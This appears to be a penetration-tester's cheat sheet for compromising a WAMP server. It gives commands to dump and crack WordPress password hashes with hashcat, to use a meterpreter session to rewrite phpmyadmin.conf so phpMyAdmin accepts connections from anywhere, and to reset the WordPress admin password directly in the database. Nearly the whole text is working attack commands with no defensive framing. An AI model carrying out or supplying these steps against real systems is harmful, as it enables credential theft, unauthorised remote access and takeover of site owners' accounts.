# WAMP
- Dump and crack Web app (e.g. WordPress) hashed credentials.
  ```
  show databases;
  use wordpress;
  select * from wp_users;
  
  1 | admin      | $P$BXzMzwqxm65vuHegt/rsJN2VbXPtT.1 | admin         | admin@example.com
  
  hashcat -m400 -a0 hashes.txt /usr/share/wordlists/rockyou.txt
  ```

- Modify phpmyadmin.conf to allow remote access.
  ```
  meterpreter > cd C:\\wamp\\alias\\
  meterpreter > dir
  meterpreter > download C:\\wamp\\alias\\phpmyadmin.conf
  
  <Directory "c:/wamp/apps/phpmyadmin3.4.10.1/">
      Options Indexes FollowSymLinks MultiViews
      AllowOverride all
          Order Deny,Allow --> Delete
          Deny from all --> Delete
          Allow from 127.0.0.1 --> Allow from all
  </Directory>
  
  meterpreter > upload ~/phpmyadmin.conf
  meterpreter > cat phpmyadmin.conf
  meterpreter > shell
  
  net stop wampapache
  net start wampapache
  ```

- Access /phpmyadmin.
  - No phpMyAdmin user - phpMyAdmin is a front-end for MySQL, only MySQL users.
  ```
  http://<ip>:8585/phpmyadmin
  ```

- Change WordPress admin password from phpMyAdmin.
  ```
  Click on wordpress.
  Click on wp-users.
  Edit admin user.
  Set user_pass to MD5 (function) and password123 (Value).
  
  Go back to http://<ip>:8585/ and click on wordpress under Your Projects.
  Alternatively, go to http://<ip>:8585/wordpress/wp-admin.
  Log in with the new password.
  ```

- Change WordPress admin password with mysql.
  ```
  mysql -u root -p -h <ip>
  use wordpress;
  UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
  ```
